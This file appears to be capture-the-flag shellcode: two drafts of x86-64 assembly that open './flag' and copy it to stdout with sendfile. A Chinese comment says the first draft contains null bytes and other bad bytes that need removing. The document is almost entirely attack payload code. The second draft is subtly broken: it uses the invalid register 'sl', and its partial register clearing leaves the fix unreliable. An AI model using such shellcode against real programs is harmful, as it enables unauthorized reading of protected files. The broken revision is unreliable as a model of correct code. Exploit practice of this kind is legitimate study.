.global _start
_start:
.intel_syntax noprefix
        xor rax, rax
        mov al, 2    # sys_open
        lea rdi, [rip+flag]
        xor rsi, rsi
        xor rdx, rdx
        syscall
        mov rsi, rax  # 文件句柄
        mov al, 40   # sys_sendfile
        xor rdi, rdi  # out_fd = 1
        inc rdi
        mov r10, 0x3e8
        syscall       # 1, fd, 0, 0x3e8=1000
        mov al, 60
        xor rdi, rdi
        syscall
flag:
        .string "./flag"


# 这一版存在一些00的问题, 需要修改, 还有0x28之类的


.global _start
_start:
.intel_syntax noprefix
        xor al, al
        mov al, 2    # sys_open
        lea rdi, [rip+flag]
        xor sl, sl
        xor dl, dl
        syscall
        mov rsi, rax  # 文件句柄
        mov al, 40   # sys_sendfile
        xor rdi, rdi  # out_fd = 1
        inc rdi
        mov r10, 0x3e8
        syscall       # 1, fd, 0, 0x3e8=1000
        mov al, 60
        xor rdi, rdi
        syscall
flag:
        .string "./flag"
